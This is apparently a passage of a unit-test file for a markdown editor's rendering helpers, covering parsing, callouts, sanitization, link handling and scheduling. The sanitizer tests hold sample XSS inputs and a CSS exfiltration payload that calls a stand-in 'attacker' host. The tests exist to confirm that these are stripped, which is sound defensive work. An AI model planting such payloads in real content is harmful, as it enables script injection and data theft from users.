/**
 * md-editor — unit tests for md-render.ts pure helpers.
 *
 * Run via `npm test` (electron --test under node:test). Mirrors the test
 * pattern used by:
 *   - text-editor/editor-stats.test.ts
 *   - json-viewer/json-model.test.ts
 *   - html-viewer/html-stats.test.ts
 *   - image-viewer/keymap.test.ts
 *   - ebook-viewer/plain-text.test.ts
 *
 * DOMPurify needs a `window` to operate. The sanitize suite uses
 * `global-jsdom` (registered once for the whole file) to install the
 * browser globals before `sanitizeMarkdownHtml` is called. The
 * `parseMarkdown` / `setupLinkDelegation` / `createPreviewScheduler`
 * suites are DOM-free.
 *
 * Each of the 5 P0 / §18.4 bug fixes is covered:
 *   - §18.1.2 (token-gated debounce)        → `createPreviewScheduler` suite
 *   - §18.4.1 (DOMPurify `style` dropped)   → `sanitizeMarkdownHtml` + `DOMPURIFY_CONFIG` suite
 *   - §18.4.2 (link click delegation)       → `setupLinkDelegation` suite
 *   - §18.1.5 (the suite itself)            → existence of this file
 */

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import globalJsdom from 'global-jsdom';

import {
  parseMarkdown,
  sanitizeMarkdownHtml,
  DOMPURIFY_CONFIG,
  setupLinkDelegation,
  createPreviewScheduler,
  createRafScheduler,
  highlightCodeBlocks,
  getStatusInfo,
  countWords,
  estimateReadingMinutes,
  shouldSkipRender,
  resolveRelativeImagePath,
  resolveLocalImages,
  detectInitialTheme,
  extractToc,
  renderToc,
  wrapHtmlDocument,
  triggerDownload,
  extractMermaidBlocks,
  extractKatexBlocks,
  parseLineInput,
  _resetSandboxForTest,
} from './md-render';
import { EditorState } from '@codemirror/state';

// global-jsdom@29 needs an explicit install call to register window/document.
const jsdom = globalJsdom();
after(() => jsdom?.());

// --- parseMarkdown --------------------------------------------------------

describe('parseMarkdown', () => {
  it('renders headings, paragraphs, and links', () => {
    const html = parseMarkdown('# Title\n\nA [link](https://e.x).');
    assert.match(html, /<h1[^>]*>Title<\/h1>/);
    assert.match(html, /<a href="https:\/\/e\.x">link<\/a>/);
  });

  it('renders GFM tables when input has them', () => {
    const html = parseMarkdown('| a | b |\n|---|---|\n| 1 | 2 |');
    assert.match(html, /<table[^>]*>/);
    assert.match(html, /<td>1<\/td>/);
  });

  it('returns empty string for empty input', () => {
    assert.equal(parseMarkdown(''), '');
  });

  // §18.1.3 — every top-level block gets a data-source-line attribute so
  // the preview scroll sync can locate the right block at the editor's
  // current line (replaces the old ratio-based mapping that drifted at
  // heading / code-block boundaries).
  //
  // Note: headings (and only headings) also carry an `id="md-h-…"`
  // attribute used by the TOC anchor clicks (§18.3.1). The regexes
  // here use `[^>]*` to allow either form (with or without id) so
  // the assertions don't break when the id is added.
  it('annotates top-level blocks with data-source-line starting at 1', () => {
    const html = parseMarkdown('# Title\n\nbody text');
    // H1 starts at line 1, paragraph starts at line 3 (line 2 is blank).
    assert.match(html, /<h1[^>]*data-source-line="1"[^>]*>Title<\/h1>/);
    assert.match(html, /<p data-source-line="3">body text<\/p>/);
  });

  it('increments line numbers across multiple top-level blocks', () => {
    const html = parseMarkdown('a\n\nb\n\nc\n');
    // Three paragraphs at lines 1, 3, 5.
    assert.match(html, /<p data-source-line="1">a<\/p>/);
    assert.match(html, /<p data-source-line="3">b<\/p>/);
    assert.match(html, /<p data-source-line="5">c<\/p>/);
  });

  it('attaches data-source-line to headings, lists, code, blockquote, tables, hr', () => {
    const md = [
      '# h1',       // line 1
      '- item',     // line 2
      '> quote',    // line 3
      '```',        // line 4
      'code',       // line 5
      '```',        // line 6
      '---',        // line 7
      '| a |',      // line 8
      '|---|',      // line 9
      '| 1 |',      // line 10
    ].join('\n');
    const html = parseMarkdown(md);
    assert.match(html, /<h1[^>]*data-source-line="1"/);
    assert.match(html, /<ul data-source-line="2">/);
    assert.match(html, /<blockquote data-source-line="3">/);
    assert.match(html, /<pre data-source-line="4"><code/);
    assert.match(html, /<hr data-source-line="7"\/?>/);
    assert.match(html, /<table data-source-line="8">/);
  });

  it('does not annotate nested elements (only top-level blocks get the attribute)', () => {
    // Inside a list item, the inner <p> must NOT carry its own
    // data-source-line — that would break the 1:1 mapping to top-level
    // tokens. The list itself carries the line of its first token.
    const html = parseMarkdown('- item 1\n\n  inner paragraph\n- item 2');
    // Only one top-level <ul>, carrying line 1.
    const ulCount = (html.match(/<ul data-source-line="/g) || []).length;
    assert.equal(ulCount, 1);
    assert.match(html, /<ul data-source-line="1">/);
    // No nested <p data-source-line=> inside the list.
    assert.equal(/<p data-source-line=/g.test(html), false);
  });

  // §18.3.3 — math placeholders. The custom marked extension
  // emits `<span class="katex katex-inline" data-katex-source="…">`
  // for `$…$` and `<div class="katex katex-block"
  // data-katex-display="block" data-katex-source="…">` for `$$…$$`.
  // Verify the placeholders land in the right block context.
  it('emits inline katex placeholders for $...$ inside paragraphs', () => {
    const html = parseMarkdown('Inline: $E = mc^2$ and more.');
    assert.match(
      html,
      /<span class="katex katex-inline" data-katex-source="E = mc\^2">/
    );
  });

  it('emits block katex placeholders for $$...$$ on its own lines', () => {
    const html = parseMarkdown('$$\n\\frac{a}{b}\n$$');
    assert.match(
      html,
      /<div class="katex katex-block" data-katex-display="block"/
    );
    assert.match(
      html,
      /data-katex-source="\\frac\{a\}\{b\}"/
    );
  });

  it('does not match `$` inside code spans (codespan takes priority)', () => {
    const html = parseMarkdown('Use `$code$` literally.');
    // Inside a code span, the `$` should be part of the code, not math.
    // The output should contain a `<code>` element with `$code$`.
    assert.match(html, /<code>\$code\$<\/code>/);
    // And NOT a katex placeholder for "$code$".
    assert.equal(/class="katex katex-inline" data-katex-source="\$code\$"/.test(html), false);
  });
});

// --- callout (Obsidian / GitHub Alerts) -----------------------------------

describe('callout (Obsidian / GitHub Alerts)', () => {
  it('renders > [!NOTE] as a callout box (replaces blockquote)', () => {
    const html = parseMarkdown('> [!NOTE]\n> This is a note.');
    assert.match(html, /<div class="callout callout-note"/);
    assert.match(html, /callout-icon">📝/);
    assert.match(html, /NOTE/);
    assert.match(html, /This is a note\./);
    assert.equal(/blockquote/.test(html), false, 'blockquote should be replaced');
  });

  it('maps known types to icons + classes', () => {
    assert.match(parseMarkdown('> [!warning]\n> x'), /callout-warning/);
    assert.match(parseMarkdown('> [!warning]\n> x'), /⚠️/);
    assert.match(parseMarkdown('> [!tip]\n> x'), /callout-tip/);
    assert.match(parseMarkdown('> [!tip]\n> x'), /💡/);
    assert.match(parseMarkdown('> [!danger]\n> x'), /callout-danger/);
    assert.match(parseMarkdown('> [!danger]\n> x'), /🔥/);
  });

  it('uses a custom title after `: title`', () => {
    const html = parseMarkdown('> [!info]: My Heading\n> body');
    assert.match(html, /My Heading/);
    assert.equal(/INFO/.test(html), false, 'custom title replaces the TYPE word');
  });

  it('supports Obsidian space-form title (`[!t] Title`)', () => {
    const html = parseMarkdown('> [!note] My Heading\n> body');
    assert.match(html, /<div class="callout callout-note"/);
    assert.match(html, /My Heading/);
    assert.equal(/NOTE/.test(html), false, 'space-form title replaces the TYPE word');
  });

  it('supports Obsidian fold + space-form title (`[!t]- Title`)', () => {
    const html = parseMarkdown('> [!info]- Collapsed Title\n> hidden');
    assert.match(html, /<details class="callout callout-info"/);
    assert.equal(/open=""/.test(html), false, '`-` collapses');
    assert.match(html, /Collapsed Title/);
  });

  it('supports Obsidian fold + space-form title (`[!t]+ Title`)', () => {
    const html = parseMarkdown('> [!info]+ Expanded Title\n> shown');
    assert.match(html, /<details class="callout callout-info" open=""/);
    assert.match(html, /Expanded Title/);
  });

  it('does not treat a spaced `-` as a fold marker (`[!t] - text`)', () => {
    // The fold marker must be flush against `]`; `[!note] -5 degrees` is a
    // title starting with `-5`, NOT a collapsed callout.
    const html = parseMarkdown('> [!note] -5 degrees\n> body');
    assert.match(html, /<div class="callout callout-note"/);
    assert.equal(/<details/.test(html), false, 'spaced minus is NOT a fold');
    assert.match(html, /-5 degrees/);
  });

  it('folds with - (collapsed) and + (expanded) via <details>', () => {
    const collapsed = parseMarkdown('> [!info]-\n> hidden');
    assert.match(collapsed, /<details class="callout callout-info"/);
    assert.equal(/open=""/.test(collapsed), false);
    const expanded = parseMarkdown('> [!info]+\n> shown');
    assert.match(expanded, /<details class="callout callout-info" open=""/);
  });

  it('falls back to default icon + custom-type class for unknown types', () => {
    const html = parseMarkdown('> [!my-fancy-type]\n> x');
    assert.match(html, /callout-my-fancy-type/);
    assert.match(html, /📝/); // default
  });

  it('leaves plain blockquotes untouched', () => {
    const html = parseMarkdown('> just a quote');
    // Match the tag open — the blockquote carries data-source-line.
    assert.match(html, /<blockquote\b/);
    assert.equal(/callout/.test(html), false);
  });

  it('survives sanitizeMarkdownHtml (class + details/summary kept, style dropped)', () => {
    const clean = sanitizeMarkdownHtml(parseMarkdown('> [!warning]: T\n> body'));
    assert.match(clean, /<div class="callout callout-warning"/);
    assert.match(clean, /callout-title/);
    assert.equal(/style=/.test(clean), false);
    const folded = sanitizeMarkdownHtml(parseMarkdown('> [!info]-\n> x'));
    assert.match(folded, /<details class="callout callout-info"/);
    assert.match(folded, /<summary class="callout-title"/);
  });
});

// --- DOMPURIFY_CONFIG (§18.4.1) -------------------------------------------

describe('DOMPURIFY_CONFIG', () => {
  it("does not allow 'style' attribute (CSS-exfiltration hardening, §18.4.1)", () => {
    // Regression guard: any future change that re-adds `style` should fail
    // this test and force a deliberate review of the threat model.
    assert.equal(
      (DOMPURIFY_CONFIG.ALLOWED_ATTR as readonly string[]).includes('style'),
      false,
      "DOMPurify ALLOWED_ATTR must not include 'style' — see §18.4.1"
    );
  });

  it("does not allow 'onclick' / 'onerror' (XSS hardening)", () => {
    const attrs = DOMPURIFY_CONFIG.ALLOWED_ATTR as readonly string[];
    assert.equal(attrs.includes('onclick'), false);
    assert.equal(attrs.includes('onerror'), false);
  });

  it('still allows the safe attributes md preview needs', () => {
    const attrs = new Set(DOMPURIFY_CONFIG.ALLOWED_ATTR as readonly string[]);
    for (const must of ['href', 'src', 'alt', 'title', 'class']) {
      assert.equal(attrs.has(must), true, `expected ${must} in ALLOWED_ATTR`);
    }
  });

  it("FORBID_ATTR explicitly excludes 'style' (belt-and-suspenders for §18.4.1)", () => {
    // `USE_PROFILES: { html: true }` allows `style` by default. Dropping
    // it from `ALLOWED_ATTR` is necessary but not sufficient — we also
    // pin it in `FORBID_ATTR` so DOMPurify cannot resurrect it via the
    // HTML profile. Any future change that removes this must be a
    // deliberate review of the CSS-exfiltration threat model.
    const forbidden = new Set(
      (DOMPURIFY_CONFIG as { FORBID_ATTR?: readonly string[] }).FORBID_ATTR ?? []
    );
    assert.equal(forbidden.has('style'), true, "FORBID_ATTR must include 'style'");
  });
});

// --- sanitizeMarkdownHtml ------------------------------------------------

describe('sanitizeMarkdownHtml', () => {
  it('strips <script> elements entirely', () => {
    const raw = '<p>safe</p><script>alert(1)</script>';
    const clean = sanitizeMarkdownHtml(raw);
    assert.equal(clean.includes('<script'), false);
    assert.equal(clean.includes('alert(1)'), false);
    assert.match(clean, /<p>safe<\/p>/);
  });

  it('strips inline `style` attribute (§18.4.1 regression)', () => {
    const raw =
      '<a href="https://e.x" style="background:url(http://attacker/?c=1)">x</a>';
    const clean = sanitizeMarkdownHtml(raw);
    // The <a> and href are allowed; the style attribute must be gone.
    assert.match(clean, /<a href="https:\/\/e\.x">x<\/a>/);
    assert.equal(clean.includes('style='), false);
    assert.equal(clean.includes('background'), false);
    assert.equal(clean.includes('attacker'), false);
  });

  it('strips event handler attributes (onclick / onerror)', () => {
    const raw = '<a href="x" onclick="alert(1)">x</a><img src="x" onerror="alert(2)">';
    const clean = sanitizeMarkdownHtml(raw);
    assert.equal(clean.includes('onclick'), false);
    assert.equal(clean.includes('onerror'), false);
  });

  it('passes through allowed content unchanged', () => {
    const raw = '<h1>Title</h1><p>body with <code>code</code>.</p>';
    const clean = sanitizeMarkdownHtml(raw);
    assert.match(clean, /<h1>Title<\/h1>/);
    assert.match(clean, /<code>code<\/code>/);
  });

  it('allows embedded HTML tags: kbd / mark / details / summary / ins / del / sub / sup (still strips <script>)', () => {
    const raw =
      '<kbd>Ctrl</kbd><mark>hl</mark><details><summary>t</summary>b</details>' +
      '<ins>add</ins><del>rm</del><sub>2</sub><sup>2</sup>' +
      '<script>alert(1)</script>';
    const clean = sanitizeMarkdownHtml(raw);
    assert.match(clean, /<kbd>Ctrl<\/kbd>/);
    assert.match(clean, /<mark>hl<\/mark>/);
    assert.match(clean, /<details><summary>t<\/summary>b<\/details>/);
    assert.match(clean, /<ins>add<\/ins>/);
    assert.match(clean, /<del>rm<\/del>/);
    assert.equal(clean.includes('<script'), false);
  });
});

// --- setupLinkDelegation (§18.4.2) ---------------------------------------

describe('setupLinkDelegation', () => {
  it('catches click on a direct <a> child', () => {
    const el = document.createElement('div');
    el.innerHTML = '<a href="https://e.x">link</a>';
    const seen: string[] = [];
    setupLinkDelegation(el, (href) => seen.push(href));

    const a = el.querySelector('a')!;
    a.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));

    assert.deepEqual(seen, ['https://e.x']);
  });

  it('catches click on a nested element inside <a> (event delegation)', () => {
    // The point of delegation: a click on <span> inside <a> still triggers
    // the handler. The old per-anchor `addEventListener` would have caught
    // this only if the listener was on the <a> itself.
    const el = document.createElement('div');
    el.innerHTML = '<a href="https://e.x"><span>inner</span></a>';
    const seen: string[] = [];
    setupLinkDelegation(el, (href) => seen.push(href));

    const span = el.querySelector('span')!;
    span.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));

    assert.deepEqual(seen, ['https://e.x']);
  });

  it('survives innerHTML replacement (no re-binding required)', () => {
    // The old per-render code did `querySelectorAll('a') + addEventListener`
    // inside renderPreview — re-binding listeners on every render. With
    // delegation, one listener on the pane handles all future anchors.
    const el = document.createElement('div');
    el.innerHTML = '<a href="https://a">A</a>';
    const seen: string[] = [];
    setupLinkDelegation(el, (href) => seen.push(href));

    // Replace innerHTML with new anchors. The OLD code would have bound
    // listeners on the new anchors only because it re-queries every render.
    // The new code doesn't need to.
    el.innerHTML = '<a href="https://b">B</a>';

    el.querySelector('a')!.dispatchEvent(
      new MouseEvent('click', { bubbles: true, cancelable: true })
    );

    assert.deepEqual(seen, ['https://b']);
  });

  it('does NOT fire on clicks outside any <a>', () => {
    const el = document.createElement('div');
    el.innerHTML = '<p>plain</p>';
    const seen: string[] = [];
    setupLinkDelegation(el, (href) => seen.push(href));

    el.querySelector('p')!.dispatchEvent(
      new MouseEvent('click', { bubbles: true, cancelable: true })
    );

    assert.deepEqual(seen, []);
  });

  it('ignores <a> without href', () => {
    const el = document.createElement('div');
    el.innerHTML = '<a>no href</a>';
    const seen: string[] = [];
    setupLinkDelegation(el, (href) => seen.push(href));

    el.querySelector('a')!.dispatchEvent(
      new MouseEvent('click', { bubbles: true, cancelable: true })
    );

    assert.deepEqual(seen, []);
  });

  it('returns an unbind function that removes the listener', () => {
    const el = document.createElement('div');
    el.innerHTML = '<a href="https://e.x">x</a>';
    const seen: string[] = [];
    const unbind = setupLinkDelegation(el, (href) => seen.push(href));

    unbind();
    el.querySelector('a')!.dispatchEvent(
      new MouseEvent('click', { bubbles: true, cancelable: true })
    );

    assert.deepEqual(seen, []);
  });

  it('calls preventDefault on the click (host decides what to do)', () => {
    const el = document.createElement('div');
    el.innerHTML = '<a href="https://e.x">x</a>';
    setupLinkDelegation(el, () => undefined);

    const ev = new MouseEvent('click', { bubbles: true, cancelable: true });
    el.querySelector('a')!.dispatchEvent(ev);

    assert.equal(ev.defaultPrevented, true);
  });
});

// --- createPreviewScheduler (§18.1.2) ------------------------------------

// Helper: wait for the next macrotask tick.
const tick = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

describe('createPreviewScheduler', () => {
  it('debounces rapid schedule() calls into a single fire', async () => {
    const sch = createPreviewScheduler(30);
    const fired: string[] = [];
    const getDoc = () => 'doc-1';

    sch.schedule(getDoc, (d) => fired.push(d));
    sch.schedule(getDoc, (d) => fired.push(d));
    sch.schedule(getDoc, (d) => fired.push(d));

    await tick(60);

    assert.deepEqual(fired, ['doc-1']);
  });

  it('fires with the latest getDoc() result (not a stale snapshot)', async () => {
    const sch = createPreviewScheduler(30);
    const fired: string[] = [];
    let current = 'v1';
    sch.schedule(() => current, (d) => fired.push(d));
    await tick(60);
    assert.deepEqual(fired, ['v1']);

    sch.schedule(() => current, (d) => fired.push(d));
    current = 'v2';
    await tick(60);
    assert.deepEqual(fired, ['v1', 'v2']);
  });

  it('drops stale callbacks when a newer schedule() supersedes (§18.1.2 token guard)', async () => {
    // This is the core race fix. Schedule A, then schedule B before A's
    // timer fires. A's callback must NOT run; only B's.
    const sch = createPreviewScheduler(30);
    const fired: string[] = [];

    sch.schedule(() => 'A', (d) => fired.push(`A:${d}`));
    // Immediately schedule B — invalidates A's token.
    sch.schedule(() => 'B', (d) => fired.push(`B:${d}`));

    await tick(60);

    assert.deepEqual(fired, ['B:B']);
  });

  it('cancel() prevents the pending fire and invalidates the token', async () => {
    const sch = createPreviewScheduler(30);
    const fired: string[] = [];
    sch.schedule(() => 'X', (d) => fired.push(d));
    sch.cancel();

    await tick(60);
    assert.deepEqual(fired, []);

    // After cancel, a fresh schedule should still work.
    sch.schedule(() => 'Y', (d) => fired.push(d));
    await tick(60);
    assert.deepEqual(fired, ['Y']);
  });

  it('survives view swap: cancel() + schedule() of new view is the safe pattern', async () => {
    // Simulates the file-switch flow: scheduler.cancel() in setContent,
    // scheduler.schedule() on the new view's updateListener. The old
    // pending timer (if not cleared) would render against the new view's
    // doc — a redundant render. With cancel() it doesn't fire.
    const sch = createPreviewScheduler(30);
    const fired: string[] = [];

    // Old view schedules a render.
    sch.schedule(() => 'old-view-doc', (d) => fired.push(d));
    // User switches files → cancel() drops the pending render.
    sch.cancel();
    // New view schedules a render.
    sch.schedule(() => 'new-view-doc', (d) => fired.push(d));

    await tick(60);

    assert.deepEqual(fired, ['new-view-doc']);
  });
});

// --- highlightCodeBlocks (§18.1.4) ----------------------------------------

describe('highlightCodeBlocks', () => {
  it('is a no-op when no <pre><code> blocks are present', () => {
    const el = document.createElement('div');
    el.innerHTML = '<p>plain text</p><ul><li>item</li></ul>';
    // Should not throw and should not mutate the DOM beyond <p>/<ul>.
    highlightCodeBlocks(el);
    assert.equal(el.querySelectorAll('pre').length, 0);
  });

  it('applies hljs-* classes to <pre><code> blocks (JS example)', () => {
    const el = document.createElement('div');
    el.innerHTML =
      '<pre><code class="language-js">const x = 42;\nfunction f() { return x; }</code></pre>';
    highlightCodeBlocks(el);
    const code = el.querySelector('code')!;
    // highlight.js always sets a class containing 'hljs' on the element.
    // The exact list of token span classes varies by language but the
    // outer container must be marked.
    assert.ok(
      /hljs/.test(code.className),
      `expected /hljs/ in code className, got "${code.className}"`
    );
    // The element should have child <span>s from tokenizing (keywords,
    // strings, etc.) — JS has at least a few tokens.
    assert.ok(
      code.querySelectorAll('span').length > 0,
      'expected at least one token span after highlight'
    );
  });

  it('handles a code block with no language hint gracefully', () => {
    const el = document.createElement('div');
    el.innerHTML = '<pre><code>plain text body</code></pre>';
    // Should not throw even with no language class.
    highlightCodeBlocks(el);
    // highlight.js auto-detects or leaves the body untouched — either way
    // the element still exists and has children.
    assert.ok(el.querySelector('code')!);
  });

  it('processes multiple <pre><code> blocks independently', () => {
    const el = document.createElement('div');
    el.innerHTML = [
      '<pre><code class="language-python">def f(): return 1</code></pre>',
      '<pre><code class="language-bash">echo hello</code></pre>',
    ].join('');
    highlightCodeBlocks(el);
    const codes = el.querySelectorAll('code');
    assert.equal(codes.length, 2);
    // Both should have the hljs marker on their outer class.
    for (const c of Array.from(codes)) {
      assert.ok(/hljs/.test((c as HTMLElement).className));
    }
  });
});

// --- countWords / getStatusInfo (§18.2.2) --------------------------------

describe('countWords', () => {
  it('returns 0 for empty input', () => {
    assert.equal(countWords(''), 0);
  });

  it('counts whitespace-separated tokens', () => {
    assert.equal(countWords('hello world'), 2);
    assert.equal(countWords('  a  b  c  '), 3);
    assert.equal(countWords('one\ntwo\tthree'), 3);
  });

  it('handles tabs and newlines as separators', () => {
    assert.equal(countWords('a\tb\nc'), 3);
  });

  it('counts each CJK character as one word (§18.3.6 — 字数 convention)', () => {
    // CJK has no whitespace between words; we count each character as one
    // (matches Chinese word processors' 字数), plus Latin tokens. A Latin
    // word glued to CJK ("hello你好") still counts as one Latin word.
    assert.equal(countWords('你好世界'), 4);
    assert.equal(countWords('你好 world'), 3); // 2 CJK + 1 Latin
    assert.equal(countWords('hello你好'), 3); // 1 Latin (glued) + 2 CJK
  });
});

describe('getStatusInfo', () => {
  function stateOf(text: string, sel?: { anchor: number; head?: number }): EditorState {
    return EditorState.create({
      doc: text,
      selection: sel
        ? { anchor: sel.anchor, head: sel.head ?? sel.anchor }
        : undefined,
    });
  }

  it('reports Ln 1, Col 1 for an empty document', () => {
    const info = getStatusInfo(stateOf(''));
    assert.deepEqual(info, {
      line: 1,
      col: 1,
      length: 0,
      selection: 0,
      words: 0,
      readingMinutes: 0,
    });
  });

  it('reports the cursor at Ln 1, Col 6 when anchor is past "hello"', () => {
    const info = getStatusInfo(stateOf('hello', { anchor: 5 }));
    assert.equal(info.line, 1);
    assert.equal(info.col, 6);
    assert.equal(info.length, 5);
    assert.equal(info.selection, 0);
    assert.equal(info.words, 1);
  });

  it('reports Ln 2 with the column reset to 1 at line start', () => {
    const text = 'first\nsecond';
    // Anchor at index 6 is the very start of "second" → Ln 2, Col 1.
    const info = getStatusInfo(stateOf(text, { anchor: 6 }));
    assert.equal(info.line, 2);
    assert.equal(info.col, 1);
  });

  it('measures selection length as `to - from`', () => {
    const text = 'hello world';
    // Selection from 6 (start of "world") to 11 (end) → 5 chars.
    const info = getStatusInfo(stateOf(text, { anchor: 6, head: 11 }));
    assert.equal(info.selection, 5);
    assert.equal(info.line, 1);
    assert.equal(info.col, 7);
  });

  it('counts words across the whole document, not just the selection', () => {
    const info = getStatusInfo(stateOf('one two three four', { anchor: 3 }));
    assert.equal(info.words, 4);
  });
});

// --- estimateReadingMinutes (§18.3.6) -----------------------------------

describe('estimateReadingMinutes', () => {
  it('returns 0 for empty input', () => {
    assert.equal(estimateReadingMinutes(''), 0);
  });

  it('returns 0 for empty input (only)', () => {
    assert.equal(estimateReadingMinutes(''), 0);
  });

  it('returns at least 1 min for any non-empty doc (even "hi")', () => {
    // "hi" is 0.01 min raw, but the contract is "non-empty → at least
    // 1 min" so the status bar shows "1 min" instead of "0 min" for
    // any non-empty doc (avoids the broken-looking "0 min" indicator).
    assert.equal(estimateReadingMinutes('hi'), 1);
  });

  it('returns at least 1 min for non-empty English docs', () => {
    // 50 words / 200 wpm = 0.25 min → max(1, round(0.25)) = 1.
    const text = Array.from({ length: 50 }, () => 'word').join(' ');
    assert.equal(estimateReadingMinutes(text), 1);
  });

  it('scales with English word count (~200 wpm)', () => {
    // 200 words / 200 wpm = 1 min; 400 words = 2 min.
    const text200 = Array.from({ length: 200 }, () => 'word').join(' ');
    const text400 = Array.from({ length: 400 }, () => 'word').join(' ');
    assert.equal(estimateReadingMinutes(text200), 1);
    assert.equal(estimateReadingMinutes(text400), 2);
  });

  it('handles CJK as separate count (~400 cpm, faster than English wpm)', () => {
    // 400 CJK chars / 400 cpm = 1 min.
    const text = '字'.repeat(400);
    assert.equal(estimateReadingMinutes(text), 1);
  });

  it('combines English and CJK in mixed docs', () => {
    // 200 English words + 400 CJK chars
    // = (200/200) + (400/400) = 1 + 1 = 2 min.
    const en = Array.from({ length: 200 }, () => 'word').join(' ');
    const cjk = '字'.repeat(400);
    assert.equal(estimateReadingMinutes(`${en}\n\n${cjk}`), 2);
  });
});

// --- resolveRelativeImagePath / resolveLocalImages (§18.2.3) ---------------

describe('resolveRelativeImagePath', () => {
  it('returns null for empty / scheme-bearing inputs', () => {
    assert.equal(resolveRelativeImagePath('/notes', ''), null);
    assert.equal(resolveRelativeImagePath('/notes', 'https://e.x/img.png'), null);
    assert.equal(resolveRelativeImagePath('/notes', 'http://e.x/img.png'), null);
    assert.equal(resolveRelativeImagePath('/notes', 'data:image/png;base64,xxx'), null);
    assert.equal(resolveRelativeImagePath('/notes', 'blob:http://e.x/abc'), null);
    assert.equal(resolveRelativeImagePath('/notes', 'mailto:a@b'), null);
  });

  it('returns absolute paths unchanged (Unix /)', () => {
    assert.equal(
      resolveRelativeImagePath('/notes', '/abs/img.png'),
      '/abs/img.png'
    );
  });

  it('returns absolute Windows paths with backslashes → forward slashes', () => {
    assert.equal(
      resolveRelativeImagePath('C:/notes', 'C:\\abs\\img.png'),
      'C:/abs/img.png'
    );
    assert.equal(
      resolveRelativeImagePath('C:/notes', 'C:/abs/img.png'),
      'C:/abs/img.png'
    );
  });

  it('resolves relative path against currentDir', () => {
    assert.equal(
      resolveRelativeImagePath('/notes', './cover.png'),
      '/notes/cover.png'
    );
    assert.equal(
      resolveRelativeImagePath('/notes', 'images/cover.png'),
      '/notes/images/cover.png'
    );
    assert.equal(
      resolveRelativeImagePath('/notes', '../other/cover.png'),
      '/notes/../other/cover.png'
    );
  });

  it('strips trailing separator on currentDir before joining', () => {
    assert.equal(
      resolveRelativeImagePath('/notes/', 'cover.png'),
      '/notes/cover.png'
    );
    assert.equal(
      resolveRelativeImagePath('C:\\notes\\', 'cover.png'),
      'C:/notes/cover.png'
    );
  });

  it('returns null for relative path when currentDir is missing', () => {
    assert.equal(resolveRelativeImagePath(null, 'cover.png'), null);
    assert.equal(resolveRelativeImagePath(undefined, 'cover.png'), null);
    assert.equal(resolveRelativeImagePath('', 'cover.png'), null);
  });
});

describe('resolveLocalImages', () => {
  it('rewrites relative <img src> into whale-file:// URLs', () => {
    const el = document.createElement('div');
    el.innerHTML = '<p>before</p><img src="./cover.png"><img src="images/x.png"><p>after</p>';
    resolveLocalImages(el, '/notes');
    const imgs = el.querySelectorAll('img');
    assert.match(imgs[0].getAttribute('src')!, /^whale-file:\/\//);
    assert.match(imgs[1].getAttribute('src')!, /^whale-file:\/\//);
    // Both should now encode a path that starts with /notes/...
    assert.ok(
      imgs[0].getAttribute('src')!.includes('notes') &&
        imgs[0].getAttribute('src')!.includes('cover.png')
    );
    assert.ok(imgs[1].getAttribute('src')!.includes('images'));
  });

  it('is a no-op when currentDir is missing (older hosts)', () => {
    const el = document.createElement('div');
    el.innerHTML = '<img src="./cover.png">';
    resolveLocalImages(el, null);
    // src stays as the original relative form.
    assert.equal(el.querySelector('img')!.getAttribute('src'), './cover.png');
  });

  it('leaves absolute and remote URLs untouched', () => {
    const el = document.createElement('div');
    el.innerHTML = [
      '<img src="https://e.x/x.png">',
      '<img src="data:image/png;base64,abc">',
    ].join('');
    resolveLocalImages(el, '/notes');
    const imgs = el.querySelectorAll('img');
    // Remote / data URIs are scheme-bearing — `resolveRelativeImagePath`
    // returns null and the resolver leaves the src unchanged.
    assert.equal(imgs[0].getAttribute('src'), 'https://e.x/x.png');
    assert.equal(imgs[1].getAttribute('src'), 'data:image/png;base64,abc');
  });

  it('encodes absolute local paths into whale-file:// URLs', () => {
    // An absolute path like `/abs/img.png` IS a local file (assuming
    // same machine), so it should also be encoded as a whale-file://
    // URL. The browser cannot load `/abs/...` directly from the
    // sandboxed iframe, so wrapping is required.
    const el = document.createElement('div');
    el.innerHTML = '<img src="/abs/img.png">';
    resolveLocalImages(el, '/notes');
    const img = el.querySelector('img')!;
    assert.match(img.getAttribute('src')!, /^whale-file:\/\//);
  });

  it('is a no-op when no <img> elements are present', () => {
    const el = document.createElement('div');
    el.innerHTML = '<p>plain prose</p>';
    // Should not throw.
    resolveLocalImages(el, '/notes');
    assert.equal(el.querySelectorAll('img').length, 0);
  });
});

// --- shouldSkipRender / createRafScheduler (§18.2.4) ---------------------

describe('shouldSkipRender', () => {
  it('returns false for the first render (no previous content)', () => {
    assert.equal(shouldSkipRender(null, 'hello'), false);
  });

  it('returns true when content is byte-identical to the previous render', () => {
    assert.equal(shouldSkipRender('hello', 'hello'), true);
  });

  it('returns false when content differs by even one character', () => {
    assert.equal(shouldSkipRender('hello', 'Hello'), false); // case
    assert.equal(shouldSkipRender('hello', 'hello '), false); // trailing space
    assert.equal(shouldSkipRender('hello', 'hell'), false); // shorter
    assert.equal(shouldSkipRender('hi', 'hello'), false); // longer
  });

  it('treats an empty-string previous as a valid baseline (empty doc re-render)', () => {
    assert.equal(shouldSkipRender('', ''), true);
    assert.equal(shouldSkipRender('', 'x'), false);
  });
});

describe('createRafScheduler', () => {
  it('runs the scheduled fn on the next animation frame', async () => {
    const sch = createRafScheduler();
    const fired: string[] = [];
    sch.schedule(() => fired.push('called'));
    // Wait at least one rAF cycle (~16ms at 60Hz).
    await new Promise((r) => requestAnimationFrame(() => r(undefined)));
    assert.deepEqual(fired, ['called']);
  });

  it('cancels a pending rAF (fn never runs)', async () => {
    const sch = createRafScheduler();
    const fired: string[] = [];
    sch.schedule(() => fired.push('called'));
    sch.cancel();
    await new Promise((r) => requestAnimationFrame(() => r(undefined)));
    await new Promise((r) => requestAnimationFrame(() => r(undefined)));
    assert.deepEqual(fired, []);
  });

  it('coalesces multiple schedule() calls within the same frame', async () => {
    const sch = createRafScheduler();
    const fired: string[] = [];
    sch.schedule(() => fired.push('1'));
    sch.schedule(() => fired.push('2'));
    sch.schedule(() => fired.push('3'));
    await new Promise((r) => requestAnimationFrame(() => r(undefined)));
    assert.deepEqual(fired, ['3']); // only the latest runs
  });
});

// --- detectInitialTheme (§18.2.5) ----------------------------------------

describe('detectInitialTheme', () => {
  it("returns 'light' when no window.matchMedia is available", () => {
    // Save and clear matchMedia to simulate old browsers.
    const g = globalThis as { window?: { matchMedia?: unknown } };
    const saved = g.window;
    g.window = {} as { matchMedia?: unknown };
    try {
